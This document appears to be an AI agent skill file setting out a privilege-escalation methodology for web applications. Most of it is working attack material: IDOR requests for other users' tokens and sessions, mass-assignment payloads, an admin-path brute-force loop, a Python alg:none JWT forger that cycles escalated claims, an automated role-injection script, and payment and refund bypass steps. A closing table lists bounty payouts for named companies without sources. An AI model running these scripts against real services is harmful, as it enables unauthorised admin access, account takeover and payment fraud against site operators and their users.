---
name: hunt-priv-esc-chain
description: Privilege escalation chain methodology — horizontal→vertical→admin, permission creep exploitation, role confusion attacks, scope escalation patterns, JWT privilege escalation, API versioning privilege gaps, feature flag bypass, admin function discovery. Use when you have low-privilege access and want to escalate to admin/root/full-access.
tags: [privilege-escalation, priv-esc, horizontal, vertical, admin, role-confusion, scope, feature-flag, jwt-privesc]
---

# Privilege Escalation Chain Methodology

## 1. ESCALATION TAXONOMY

```
Level 0: Unauthenticated
Level 1: Authenticated (regular user)
Level 2: Premium/Paid user (more features)
Level 3: Organization Admin
Level 4: Super Admin / Staff
Level 5: Platform Admin (internal)

Attack paths:
0→1: Auth bypass (no account needed)
1→2: Feature flag bypass, payment bypass
1→3: Role IDOR, permission assignment bypass
3→4: Admin panel IDOR, privilege parameter injection
Any→5: JWT alg confusion, SQLi in admin, SSRF to internal admin

Chain: 0→1→3→5 = Full platform compromise
```

---

## 2. HORIZONTAL PRIVILEGE ESCALATION

### IDOR to Access Same-Level Resources
```python
# Already covered in hunt-idor, but priv-esc context:
# Horizontal = access ANOTHER user's resources at same privilege level

# Key: horizontal priv-esc is the FOUNDATION of vertical chains
# Access user B's data → find admin tokens, API keys, escalation paths

# Find users with higher privileges:
# 1. IDOR to user ID 1, 2, 3 (often admins)
# 2. Access their profile, find role/permissions
# 3. Find API tokens in their profile → use those tokens

GET /api/users/1/profile          → admin user data
GET /api/users/1/api-tokens       → admin API keys
GET /api/users/1/session-tokens   → active sessions → hijack admin session

# Or: IDOR on team/org level
GET /api/organizations/1/members  → see all org members including admins
GET /api/organizations/1/settings → org settings including admin actions
```

---

## 3. VERTICAL PRIVILEGE ESCALATION

### Role Parameter Manipulation
```http
# Common: role or permissions sent in request body

POST /api/users/register HTTP/1.1
{
  "email": "attacker@evil.com",
  "password": "Password123!",
  "role": "admin"           ← Add role to registration
}

# Profile update:
PUT /api/users/me HTTP/1.1
{
  "name": "Normal User",
  "role": "admin",          ← Add role parameter
  "is_admin": true,         ← Common boolean
  "permissions": ["admin", "read:all", "write:all"]  ← Array
}

# If any of these accepted → instant privilege escalation

# Mass assignment patterns to try:
POST /api/update-profile
{
  "name": "test",
  "role": "admin",
  "is_admin": true,
  "is_staff": true,
  "account_type": "enterprise",
  "plan": "unlimited",
  "permissions": ["*"],
  "groups": ["admins"],
  "scope": "admin:all",
  "user_level": 9,
  "access_level": "superadmin"
}
```

### Hidden Admin Endpoints — Discovery
```bash
# Common admin endpoint patterns
ADMIN_PATHS=(
  "/admin" "/admin/" "/administration"
  "/api/admin" "/api/v1/admin" "/api/internal"
  "/_admin" "/__admin" "/admin-panel"
  "/dashboard/admin" "/manage" "/management"
  "/console" "/system" "/control"
  "/staff" "/superuser" "/root"
  "/api/staff" "/api/superuser"
  "/swagger" "/api-docs" "/openapi.json"  # May reveal admin endpoints
  "/graphql" "/__graphql" "/api/graphql"  # Introspection for admin mutations
)

for path in "${ADMIN_PATHS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "Cookie: session=USER_SESSION" "https://target.com$path")
  [[ "$STATUS" != "404" ]] && echo "$STATUS $path"
done
```

### Admin Function in User Context
```
Pattern: Admin functions exist but with missing auth check
Test: Authenticated as regular user, try admin actions

Common misses:
1. Object-level check but no function-level check
   Regular user can access /api/admin/users if they guess the URL
   
2. Check done only on GET, not POST
   GET /api/admin/users → 403
   POST /api/admin/users → 200 (creates admin user)
   
3. Check done on one version, not another
   /api/v2/admin/promote → 403
   /api/v1/admin/promote → 200 (old version, less strict)

4. Frontend hides admin buttons, but API works
   Intercept traffic in Burp, replay admin API calls directly
   Admin actions not shown in UI but work when called directly
```

---

## 4. JWT PRIVILEGE ESCALATION

### JWT Claim Manipulation
```python
import jwt, base64, json

# Decode without verification
def decode_jwt(token):
    parts = token.split('.')
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    return payload

# Common priv-esc claims to manipulate:
CLAIMS_TO_ESCALATE = {
    "role": ["admin", "superadmin", "staff", "moderator", "root"],
    "is_admin": [True, 1, "true", "1"],
    "scope": ["admin:all", "write:admin", "read:all write:all delete:all"],
    "permissions": ["admin", "*", "all"],
    "user_type": ["admin", "staff", "super_user"],
    "access_level": [9, 99, 999, "full", "unlimited"],
    "groups": [["admin", "superuser", "staff"]],
    "plan": ["enterprise", "unlimited", "admin"],
}

# Test alg:none to forge without signature:
def forge_jwt_none(payload):
    header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=').decode()
    body = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
    return f"{header}.{body}."

# Test each claim modification
original_payload = decode_jwt(my_token)
for claim, values in CLAIMS_TO_ESCALATE.items():
    for value in values:
        modified = dict(original_payload)
        modified[claim] = value
        forged = forge_jwt_none(modified)
        # Test forged token
        test_admin_access(forged)
```

---

## 5. FEATURE FLAG / PLAN BYPASS

### Access Premium Features for Free
```python
# Feature flags often controlled by:
# 1. JWT claim: {"plan": "free", "features": ["basic"]}
# 2. Request header: X-Feature-Flag: premium_enabled
# 3. Cookie: plan=free
# 4. Account attribute checked server-side (more secure)

# Test 1: Modify JWT plan claim
# Change: {"plan": "free"} → {"plan": "enterprise"}
# If not validated server-side → free enterprise access

# Test 2: Feature flag header injection
curl https://target.com/api/premium-feature \
  -H "X-Feature-Flag: enabled" \
  -H "X-Plan: enterprise" \
  -H "X-Premium: true" \
  -H "Cookie: session=FREE_USER_SESSION"

# Test 3: API direct access (frontend blocked, API not)
# UI: "Upgrade to Enterprise" button disabled for free users
# But: POST /api/export → may work without plan check

# Test 4: Coupon/promo code bypass
# Find coupon code patterns in JS source
# Test: ADMIN, FREE, ENTERPRISE, TEST, BYPASS
POST /api/apply-coupon
{"code": "ADMIN100"}

# Test 5: Trial extension
# Many apps have trial extension endpoint
POST /api/trial/extend
{"duration": 999999, "plan": "enterprise"}
```

### Payment Flow Bypass
```
1. Intercept payment request in Burp
2. Complete payment with test card (if test mode active)
   4242424242424242 (Stripe test) — does it activate real features?
3. Price manipulation:
   POST /api/checkout {"plan": "enterprise", "price": 0.01}
4. Skip payment step:
   GET /api/payment/success?order_id=FAKE_ID
5. Refund after access:
   Some apps: refund doesn't revoke access immediately
```

---

## 6. API VERSION PRIVILEGE GAPS

```python
# Old API versions often have weaker auth, more permissive behavior

# Map all API versions:
VERSIONS = ['v1', 'v2', 'v3', 'v4', 'v5', 'v0', 'v1.0', 'v2.0', 'beta', 'alpha', 'internal']

for version in VERSIONS:
    r = requests.get(f"https://target.com/api/{version}/users")
    if r.status_code != 404:
        print(f"API {version}: {r.status_code}")

# Common findings:
# /api/v1/users → requires admin
# /api/v2/users → requires admin  
# /api/v0/users → NO AUTH (old version never patched)

# Admin actions only in v1 (thought deprecated):
# /api/v1/admin/promote-user → still works, less validation than v2

# Undocumented version:
# /api/internal/admin/all-users → no auth
# /api/unstable/admin → debug build, no auth
```

---

## 7. PERMISSION CREEP EXPLOITATION

### Overly Permissive Token Scopes
```
OAuth scope creep: Token granted more scope than needed
Test: Request minimum scope, but call maximum scope endpoints

You have: access_token with scope=read:profile
Try: GET /api/write-endpoint → maybe works despite read-only token
Try: GET /api/admin-endpoint → maybe works despite user scope

Pattern: Scope validated at ISSUANCE but not at USE
```

### Role Confusion Attacks
```
Scenario: Application has multiple role systems

Old system: is_admin boolean
New system: roles array with granular permissions
Migration: both systems active simultaneously

Attack:
1. Old admin check: if user.is_admin == true
2. New RBAC check: if 'admin' in user.roles
3. If you can set roles=['admin'] without setting is_admin=true → bypass old checks
4. If is_admin=true bypasses new RBAC checks → set it for legacy admin access

Test: Try endpoints that check old-style vs new-style permissions
```

---

## 8. ESCALATION AUTOMATION

```python
import requests, json, itertools

TARGET = "https://target.com"

def test_privilege_escalation(session, base_profile):
    """Automated privilege escalation testing"""
    
    # Fields to inject into profile update
    priv_fields = {
        "role": ["admin", "superadmin", "staff", "moderator", "super_user", "owner"],
        "is_admin": [True, "true", "1", 1],
        "account_type": ["admin", "staff", "enterprise", "unlimited"],
        "permissions": [["*"], ["admin:all"], ["write:all", "read:all"]],
        "user_level": [9, 99, 999],
        "scope": ["admin", "admin:all", "full"],
    }
    
    results = []
    
    for field, values in priv_fields.items():
        for value in values:
            payload = dict(base_profile)
            payload[field] = value
            
            # Try profile update
            r = session.put(f"{TARGET}/api/users/me", json=payload)
            
            # Check if we got admin access
            admin_r = session.get(f"{TARGET}/api/admin/users")
            if admin_r.status_code == 200:
                results.append({
                    "field": field,
                    "value": value,
                    "profile_update": r.status_code,
                    "admin_access": True,
                    "evidence": admin_r.json()
                })
                print(f"ESCALATION VIA {field}={value}")
    
    return results
```

---

## 9. PRIV-ESC EVIDENCE COLLECTION

```
For each successful escalation, capture:
1. Regular user state (before): GET /api/users/me → role: "user"
2. Escalation request: PUT /api/users/me with malicious field
3. Response confirming change (or not — maybe update silent)
4. Post-escalation state: GET /api/users/me → role: "admin"
5. Admin action proving impact: GET /api/admin/all-users → 200

Report format:
Title: Privilege Escalation via Mass Assignment — Regular User to Admin
Severity: Critical
Steps:
1. Register normal user account
2. Send PUT /api/users/me with role=admin in body
3. Server accepts and updates role
4. Verify: GET /api/admin/panel → accessible (normally admin-only)
Impact: Any user can escalate to admin, full platform compromise
```

---

## ESCALATION CHECKLIST

```
ACCOUNT CREATION:
[ ] Can you set role/is_admin during registration?
[ ] OAuth auto-provisioning — what claims determine role?
[ ] SSO — can you inject role claims via SAML/OIDC?
[ ] Invitation flow — can you accept admin invitation without being admin?

PROFILE UPDATE:
[ ] Mass assignment in profile update endpoint
[ ] File upload metadata — role claim in avatar upload?
[ ] OAuth linking — can linking admin OAuth set your role?

API VERSIONING:
[ ] Old API versions with weaker auth?
[ ] Undocumented internal API endpoints?
[ ] Debug/test endpoints still accessible?

JWT:
[ ] alg:none bypass
[ ] HS256/RS256 confusion
[ ] kid injection
[ ] Claim manipulation (role, scope, permissions)

FEATURE/PLAN:
[ ] JWT plan claim manipulation
[ ] Header-based feature flag injection
[ ] Direct API call bypassing UI gatekeeping
[ ] Trial extension exploitation

ADMIN FUNCTION DISCOVERY:
[ ] Common admin paths accessible?
[ ] GraphQL introspection revealing admin mutations?
[ ] Error messages revealing admin endpoint names?
[ ] Swagger/OpenAPI docs revealing admin APIs?
```

---

## PAID BOUNTY EXAMPLES

| Target | Chain | Payout |
|--------|-------|--------|
| GitLab | Mass assignment → admin via API | $20,000 |
| HackerOne | IDOR → admin token → full admin | $15,000 |
| Shopify | Plan bypass → enterprise features free | $10,000 |
| Stripe | JWT scope escalation → API admin | $25,000 |
| Twilio | Role confusion → super admin | $18,500 |
| Airbnb | API v1 → admin without auth | $15,000 |
| Twitter | Mass assignment in profile → admin | $7,560 |
